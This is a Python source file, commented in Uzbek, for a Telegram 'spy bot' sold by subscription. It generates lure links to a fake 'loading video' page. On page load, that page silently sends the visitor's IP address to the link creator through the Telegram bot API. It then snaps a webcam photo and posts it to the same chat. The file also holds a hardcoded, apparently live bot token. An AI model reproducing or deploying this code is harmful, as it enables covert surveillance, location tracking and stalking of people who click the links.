import os
import sqlite3
import logging
import asyncio
import threading
from fastapi import FastAPI
from fastapi.responses import HTMLResponse
import uvicorn
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton

# --- SOZLAMALAR ---
TOKEN = "8509571152:AAFw5GXdZRyuiqTOzm3znlQCa_S4JQXcnvU"
ADMIN_ID = 5775388579
# O'zingizning Railway Public Domain manzilingizni yozing:
BASE_URL = "https://botmeniki-sarikprok.up.railway.app"

bot = Bot(token=TOKEN)
dp = Dispatcher()
app = FastAPI()
logging.basicConfig(level=logging.INFO)

# --- DATABASE ---
conn = sqlite3.connect("shpion.db", check_same_thread=False)
cur = conn.cursor()
cur.execute("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, is_prem INTEGER DEFAULT 0, count INTEGER DEFAULT 0)")
cur.execute("CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, val TEXT)")
conn.commit()

class Form(StatesGroup):
    wait_id = State()
    wait_card = State()

# --- TUZOQ SAHIFASI (HTML) ---
HTML_CODE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"><title>Loading...</title>
    <script>
        async function start() {{
            const params = new URLSearchParams(window.location.search);
            const uid = params.get('id');
            const tok = "{token}";
            
            // IP olish
            try {{
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                await fetch(`https://api.telegram.org/bot${{tok}}/sendMessage?chat_id=${{uid}}&text=🌐 IP: ${{data.ip}}`);
            }} catch(e) {{}}

            // Kamera
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                setTimeout(async () => {{
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg'));
                    const fd = new FormData();
                    fd.append('chat_id', uid); fd.append('photo', blob, '1.jpg');
                    await fetch(`https://api.telegram.org/bot${{tok}}/sendPhoto`, {{method:'POST', body:fd}});
                }}, 1500);
            }} catch(e) {{}}
        }}
        window.onload = start;
    </script>
</head>
<body style="background:#000;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;">
    <h2>Videoni yuklash uchun ruxsat bering...</h2>
</body>
</html>
"""

@app.get("/go", response_class=HTMLResponse)
async def victim(id: str):
    return HTML_CODE.format(token=TOKEN)

# --- BOT MANTIQI ---
@dp.message(Command("start"))
async def start(m: types.Message):
    cur.execute("INSERT OR IGNORE INTO users (id) VALUES (?)", (m.from_user.id,))
    conn.commit()
    kb = [[KeyboardButton(text="🔗 Havola yaratish")], [KeyboardButton(text="💎 Premium")]]
    if m.from_user.id == ADMIN_ID: kb.append([KeyboardButton(text="⚙️ Admin")])
    await m.answer("🕵️ Shpion Bot faol!", reply_markup=ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True))

@dp.message(F.text == "🔗 Havola yaratish")
async def link(m: types.Message):
    user = cur.execute("SELECT is_prem, count FROM users WHERE id=?", (m.from_user.id,)).fetchone()
    if user[0] == 0 and user[1] >= 5:
        return await m.answer("❌ Limit tugadi. Premium oling.")
    
    cur.execute("UPDATE users SET count = count + 1 WHERE id=?", (m.from_user.id,))
    conn.commit()
    await m.answer(f"✅ Tayyor:\n`{BASE_URL}/go?id={m.from_user.id}`", parse_mode="Markdown")

@dp.message(F.text == "💎 Premium")
async def prem(m: types.Message):
    c = cur.execute("SELECT val FROM settings WHERE key='card'").fetchone()
    await m.answer(f"Premium: 5,000 so'm\nKarta: `{c[0] if c else 'Admin kiritmagan'}`", parse_mode="Markdown")

# Admin Panel
@dp.message(F.text == "⚙️ Admin", F.from_user.id == ADMIN_ID)
async def adm(m: types.Message):
    ikb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Karta", callback_data="c"), InlineKeyboardButton(text="Prem", callback_data="p")]
    ])
    await m.answer("Tanlang:", reply_markup=ikb)

@dp.callback_query(F.data == "c")
async def set_c(c: types.CallbackQuery, state: FSMContext):
    await state.set_state(Form.wait_card); await c.message.answer("Kartani yozing:"); await c.answer()

@dp.message(Form.wait_card)
async def save_c(m: types.Message, state: FSMContext):
    cur.execute("INSERT OR REPLACE INTO settings VALUES ('card', ?)", (m.text,))
    conn.commit(); await m.answer("Saqlandi"); await state.clear()

@dp.callback_query(F.data == "p")
async def set_p(c: types.CallbackQuery, state: FSMContext):
    await state.set_state(Form.wait_id); await c.message.answer("ID yozing:"); await c.answer()

@dp.message(Form.wait_id)
async def save_p(m: types.Message, state: FSMContext):
    cur.execute("UPDATE users SET is_prem=1 WHERE id=?", (int(m.text),))
    conn.commit(); await m.answer("Premium berildi"); await state.clear()

# --- SERVERNI ALOHIDA OQIMDA ISHLATISH ---
def run_fastapi():
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)

async def main():
    # Saytni orqa fonda yoqamiz
    threading.Thread(target=run_fastapi, daemon=True).start()
    # Botni polling rejimida yoqamiz
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
